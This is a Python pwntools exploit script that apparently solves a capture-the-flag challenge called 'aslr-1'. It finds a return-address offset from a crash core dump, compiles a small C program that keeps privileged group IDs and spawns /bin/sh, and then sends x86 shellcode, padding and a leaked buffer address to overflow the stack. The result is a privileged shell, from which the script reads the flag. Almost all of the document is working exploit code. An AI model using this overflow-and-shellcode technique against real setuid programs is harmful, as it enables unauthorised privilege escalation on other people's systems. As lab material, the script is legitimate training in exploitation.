from pwn import *
import os

DEBUG = False 
file = "./aslr-1"
env = { "PATH":"$PATH:."} 


c_code = '''
#include <unistd.h>

int main(){
    setregid(getegid(), getegid());
    execve("/bin/sh", 0, 0);
}
'''

with open("payload.c", "w") as f:
    f.write(c_code)

os.system("gcc -o z payload.c")

io = process(file, env)
io.send(cyclic(1000))
io.wait()
core = io.corefile
max_len = cyclic(0x100).find(p32(core.eip))
os.unlink(core.path)

# launch the main process (still boilerplate)
if DEBUG:
    context.log_level = 'DEBUG'
    context.terminal = ['tmux', 'splitw', '-h']
    io = gdb.debug(file, env=env, gdbscript='''
b 0x0804861b
continue
''')

else:
    io = process(file, env=env)


# END SETUP BOILERPLATE
# BEGIN CHALLENGE-SPECIFIC CODE

shellcode = asm('''
    xor ecx, ecx
    xor edx, edx

    push 0x7a
    mov ebx, esp

    mov eax, 0xb
    int 0x80
''')

buffer_addr = int(io.recvline().split(b":")[1].strip(), 16)

payload =  shellcode + b"a" * (max_len - len(shellcode)) + p32(buffer_addr)
io.send(payload)
io.interactive()

# END CHALLENGE-SPECIFIC CODE
# BEGIN FLAG RETRIEVAL BOILERPLATE

import re
io.sendlineafter(b'Spawning a privileged shell', b'cat flag')
flag = re.search(br'candl\{[ -z|~]*}', io.recvregex(br'candl\{[ -z|~]*}')).group(0)
print(flag)
